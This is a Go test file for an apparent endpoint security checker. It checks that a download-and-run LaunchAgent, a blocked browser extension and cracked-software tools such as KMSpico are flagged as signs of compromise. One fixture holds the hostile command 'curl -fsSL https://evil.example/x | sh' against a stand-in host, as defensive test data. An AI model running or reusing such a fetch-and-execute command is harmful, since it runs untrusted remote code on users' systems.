package checks

import (
	"strings"
	"testing"

	"github.com/ptrinh/bordercheck/internal/check"
	"github.com/ptrinh/bordercheck/internal/policy"
)

// keys lists the message keys of a result's signs of compromise.
func keys(r check.Result) []string {
	var out []string
	for _, i := range r.Compromise {
		out = append(out, i.What.Key)
	}
	return out
}

// Signs of compromise are set only for the strongest findings of each check;
// lesser findings of the same check are ordinary problems.
func TestCompromiseIndicators(t *testing.T) {
	home := "/Users/demo"
	e := newStartupEnv(home, "darwin", policy.Default().Checks.StartupItems)
	dl := startupItem{Source: "LaunchAgent", Where: "~/Library/LaunchAgents/com.x.plist", Label: "com.x", Program: "/bin/sh",
		Command: "/bin/sh -c curl -fsSL https://evil.example/x | sh"}
	odd := startupItem{Source: "LaunchAgent", Where: "~/Library/LaunchAgents/com.y.plist", Label: "com.y", Program: "/tmp/y"}

	r := evalStartup([]startupItem{dl, odd}, nil, e, startupFix("darwin"))
	if r.Status != check.Fail || strings.Join(keys(r), ",") != "compromise.startupDownloadRun" ||
		r.Compromise[0].Detail != "LaunchAgent ~/Library/LaunchAgents/com.x.plist (com.x)" ||
		strings.Contains(r.Compromise[0].Detail, "evil.example") {
		t.Errorf("download-and-run: %s %+v", r.Status, r.Compromise)
	}
	if r := evalStartup([]startupItem{odd}, nil, e, startupFix("darwin")); r.Compromise != nil {
		t.Errorf("a program in /tmp is not a sign of compromise: %+v", r.Compromise)
	}
	// An item IT allows is not one either.
	p := policy.Default().Checks.StartupItems
	p.Allow = []string{"com.x"}
	if r := evalStartup([]startupItem{dl}, nil, newStartupEnv(home, "darwin", p), startupFix("darwin")); r.Compromise != nil {
		t.Errorf("allowed item: %+v", r.Compromise)
	}

	apps := []string{"Chrome", "Firefox", "VS Code"}
	x := policy.Default().Checks.Extensions
	if r := evalExtensions(extFacts{Apps: apps, Items: sampleExtItems()}, x); r.Compromise != nil {
		t.Errorf("an unpacked extension is not a sign of compromise: %+v", r.Compromise)
	}
	x.Block = []string{"evil.*"}
	r = evalExtensions(extFacts{Apps: apps, Items: sampleExtItems()}, x)
	if strings.Join(keys(r), ",") != "compromise.blockedExtension" || !strings.Contains(r.Compromise[0].Detail, "evil.miner") {
		t.Errorf("blocked extension: %+v", r.Compromise)
	}

	opts := policy.Default().Checks.CrackedSoftware
	if r := evalCracked(crackFacts{HostsPath: "/etc/hosts", Hosts: "0.0.0.0 lmlicensing.adobe.com\n"}, opts); r.Status != check.Fail || r.Compromise != nil {
		t.Errorf("a hosts-file line alone is not a sign of compromise: %s %+v", r.Status, r.Compromise)
	}
	r = evalCracked(crackFacts{KMS: map[string]string{"Windows": "127.0.0.2:1688"}, Tools: []string{`KMSpico (C:\Program Files\KMSpico)`}}, opts)
	if strings.Join(keys(r), ",") != "compromise.kmsEmulator,compromise.crackTool" ||
		r.Compromise[0].What.English() != "Windows is activated by a fake activation server running on this computer." ||
		r.Compromise[1].Detail != `KMSpico (C:\Program Files\KMSpico)` {
		t.Errorf("crack tools: %+v", r.Compromise)
	}
	if r := evalCracked(crackFacts{KMS: map[string]string{"Windows": "kms.corp.domain.com"}}, opts); r.Compromise != nil {
		t.Errorf("a company KMS server: %+v", r.Compromise)
	}
}
